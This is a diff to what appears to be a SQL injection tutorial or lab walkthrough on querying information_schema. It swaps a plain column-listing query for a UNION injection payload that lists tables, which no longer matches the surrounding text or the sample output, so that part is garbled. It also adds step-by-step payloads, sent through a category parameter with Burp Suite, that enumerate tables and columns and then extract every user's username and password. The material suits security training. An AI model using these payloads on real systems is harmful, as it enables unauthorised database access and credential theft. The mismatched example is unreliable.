@@ -149,7 +149,7 @@ This output indicates that there are three tables, called `Products`, `Users`,
 You can then query `information_schema.columns` to list the columns in individual tables:
 
 ```
-SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 ```
 
 This returns output like the following:
@@ -161,6 +161,30 @@ This returns output like the following:
 | MyDatabase    | dbo          | Users      | Password    | varchar   |
 
 This output shows the columns in the specified table and the data type of each column.
+
+1. Use Burp Suite to intercept and modify the request that sets the product category filter.
+2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
+    
+    `'+UNION+SELECT+'abc','def'--`
+3. Use the following payload to retrieve the list of tables in the database:
+    
+```
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+```
+1. Find the name of the table containing user credentials.
+2. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+
+```
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+```
+
+1. Find the names of the columns containing usernames and passwords.
+2. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+    
+
+```
+'+UNION+SELECT+username_wlpbfk,+password_nskzww+FROM+users_gowlqt--
+```
 
 ---
 
